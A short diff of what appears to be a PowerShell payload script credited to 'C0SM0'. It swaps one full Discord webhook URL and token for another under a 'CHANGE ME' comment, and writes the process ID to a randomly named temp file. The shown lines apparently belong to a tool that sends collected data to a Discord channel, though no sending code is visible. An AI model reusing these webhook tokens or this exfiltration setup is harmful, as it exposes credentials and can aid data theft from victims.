@@ -2,7 +2,7 @@
 # created by : C0SM0
 
 # webhook, CHANGE ME
-$webhook = "https://discord.com/api/webhooks/997918215244103730/R3_qp6UVV9u-JQHDThMZ8KMg9uL8zfG2Z4qLBIRWyOatCwWXsuml31SEsAYNm8oUw0_4"
+$webhook = "https://discord.com/api/webhooks/1005375031641120798/i3wZ9NgHtjhLq1ol7YPhkH39VxgdxVz-TOYTraj4iDPzihHXNvEomvrRvzWcSS9NRwCy"
 
 # write pid
 $PID > "$env:temp/DdBPKCytRe"
